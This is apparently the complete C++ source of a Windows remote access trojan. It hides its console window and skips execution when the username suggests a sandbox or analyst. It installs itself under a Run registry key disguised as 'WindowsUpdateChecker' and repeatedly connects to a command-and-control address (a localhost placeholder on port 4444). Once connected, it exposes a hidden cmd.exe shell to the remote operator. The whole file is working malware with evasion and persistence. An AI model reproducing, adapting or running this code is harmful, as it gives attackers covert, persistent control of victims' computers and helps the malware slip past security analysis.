#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>

#pragma comment(lib, "ws2_32.lib")

#define C2_IP "127.0.0.1"
#define C2_PORT 4444
#define BUF_SIZE 4096

// Evasion check: Ensure we aren't running in a known sandbox artifact directory
bool CheckEnvironment() {
    char userPath[MAX_PATH];
    DWORD size = MAX_PATH;
    if (GetEnvironmentVariableA("USERNAME", userPath, size)) {
        std::string user(userPath);
        if (user == "sandbox" || user == "analyst" || user == "virus") {
            return false;
        }
    }
    return true;
}

// Solid persistence mechanism via User Run key
void InstallPersistence() {
    HKEY hKey;
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsUpdateChecker", 0, REG_SZ, (unsigned char*)currentPath, strlen(currentPath) + 1);
        RegCloseKey(hKey);
    }
}

void ExecuteShell(SOCKET sock) {
    char buffer[BUF_SIZE];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    HANDLE hInRead, hInWrite, hOutRead, hOutWrite;

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    CreatePipe(&hInRead, &hInWrite, &sa, 0);
    CreatePipe(&hOutRead, &hOutWrite, &sa, 0);

    si.hStdInput = hInRead;
    si.hStdOutput = hOutWrite;
    si.hStdError = hOutWrite;

    CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    std::string banner = "[*] RAT Agent Active. Waiting for commands...\n> ";
    send(sock, banner.c_str(), banner.length(), 0);

    while (true) {
        memset(buffer, 0, BUF_SIZE);
        int bytesReceived = recv(sock, buffer, BUF_SIZE - 1, 0);
        if (bytesReceived <= 0) break;

        DWORD written;
        WriteFile(hInWrite, buffer, bytesReceived, &written, NULL);

        Sleep(150);

        DWORD availBytes = 0;
        PeekNamedPipe(hOutRead, NULL, 0, NULL, &availBytes, NULL);

        if (availBytes > 0) {
            char outBuffer[BUF_SIZE];
            DWORD bytesRead = 0;
            memset(outBuffer, 0, BUF_SIZE);
            ReadFile(hOutRead, outBuffer, availBytes > BUF_SIZE ? BUF_SIZE - 1 : availBytes, &bytesRead, NULL);
            send(sock, outBuffer, bytesRead, 0);
        }

        std::string prompt = "\n> ";
        send(sock, prompt.c_str(), prompt.length(), 0);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hInRead);
    CloseHandle(hInWrite);
    CloseHandle(hOutRead);
    CloseHandle(hOutWrite);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Drop console window immediately
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    if (!CheckEnvironment()) {
        return 0; // Exit silently if sandbox indicators match
    }

    InstallPersistence();

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(C2_IP);
    serverAddr.sin_port = htons(C2_PORT);

    // Reconnection loop with backoff
    while (connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        Sleep(10000);
    }

    ExecuteShell(sock);

    closesocket(sock);
    WSACleanup();
    return 0;
}